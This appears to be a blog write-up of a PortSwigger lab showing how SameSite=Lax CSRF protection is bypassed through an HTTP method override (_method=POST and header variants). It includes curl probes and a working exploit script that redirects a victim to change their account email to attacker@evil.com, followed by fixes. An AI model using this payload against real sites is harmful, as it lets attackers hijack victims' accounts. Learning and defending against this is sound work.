---
layout: post
title: "CSRF: SameSite Lax Bypass via HTTP Method Override"
date: 2027-06-28 09:00:00 -0500
categories: [Web Security, CSRF]
tags: [csrf, samesite, method-override, portswigger, cwe-352]
---

## Overview

This PortSwigger lab demonstrates how a state-changing endpoint with no CSRF token can still be exploited even when the session cookie defaults to **SameSite=Lax** — by combining two primitives: the browser's allowance of cookies on top-level cross-site GET navigations, and a server-side HTTP method override mechanism (`_method=POST`).

**CWE:** [CWE-352 — Cross-Site Request Forgery](https://cwe.mitre.org/data/definitions/352.html)

---

## The Setup

When a browser cookie is issued without an explicit `SameSite` attribute, modern browsers treat it as `SameSite=Lax`. Lax provides partial CSRF protection:

| Request type | Lax cookies sent? |
|---|---|
| Cross-site POST (form submit) | ❌ No |
| Cross-site GET (top-level nav) | ✅ Yes |

The app's session cookie had no `SameSite` attribute:

```
Set-Cookie: session=<token>; Expires=...; Secure; HttpOnly
```

The `/my-account/change-email` endpoint had no CSRF token and accepted a `_method=POST` query parameter to override the HTTP method — a convenience feature from frameworks like Ruby on Rails and Express `method-override`.

---

## Why Lax Doesn't Protect Here

SameSite=Lax blocks cross-site **POST** requests. But a `document.location` redirect is a cross-site **GET** (top-level navigation) — the browser attaches Lax cookies.

If the server treats that GET as a POST via `_method=POST`, the Lax restriction is completely circumvented.

---

## Also Check: Header-Based Override Variants

`_method=POST` is not the only mechanism. Before marking an endpoint safe, probe the header equivalents used by other frameworks:

```bash
# X-HTTP-Method-Override (Django REST Framework, some Rails configs)
curl -sk -b cookies.txt -X GET 'https://TARGET/change-email?email=test@test.com' \
  -H 'X-HTTP-Method-Override: POST' -o /dev/null -w '%{http_code}'

# X-Method-Override (ASP.NET, some Express setups)
curl -sk -b cookies.txt -X GET 'https://TARGET/change-email?email=test@test.com' \
  -H 'X-Method-Override: POST' -o /dev/null -w '%{http_code}'
```

`302` from either = same vulnerability, same `document.location` exploit.

## Confirming the Method Override

A quick curl with a valid session confirms the bypass:

```bash
curl -sk -b cookies.txt \
  'https://TARGET/my-account/change-email?email=test@test.com&_method=POST' \
  -o /dev/null -w '%{http_code}'
# → 302 (email changed — server treated GET as POST)
```

---

## Exploit

Hosted on the exploit server and delivered to the victim:

```html
<script>
document.location = "https://TARGET/my-account/change-email?email=attacker%40evil.com&_method=POST";
</script>
```

When the victim's browser loads this page:
1. `document.location` triggers a top-level GET navigation.
2. Browser attaches the victim's session cookie (SameSite=Lax allows it).
3. Server sees `_method=POST` and processes the request as a POST.
4. Email changed — no CSRF token required.

**Result:** Solved.

---

## The Fix

Three controls, all should be present:

**1. Disable method override on authenticated routes**

```javascript
// DON'T install methodOverride() globally
// scope it to specific safe endpoints if needed at all
```

**2. Add synchronizer CSRF tokens**

```javascript
app.post('/my-account/change-email', verifyCsrfToken, (req, res) => {
  db.updateEmail(req.session.userId, req.body.email);
  res.redirect('/my-account');
});
```

**3. Set SameSite=Strict if cross-site navigation with cookies isn't required**

```
Set-Cookie: session=<token>; SameSite=Strict; Secure; HttpOnly
```

SameSite alone is not sufficient when method override is present — always pair it with a CSRF token.

---

## Key Takeaway

`SameSite=Lax` is the browser's **default**, not a CSRF silver bullet. It stops cross-site POST form submissions, but a `document.location` redirect (top-level GET) still carries Lax cookies. Any server-side method-override mechanism (`_method`, `X-HTTP-Method-Override`) on a CSRF-tokenless endpoint defeats Lax entirely.
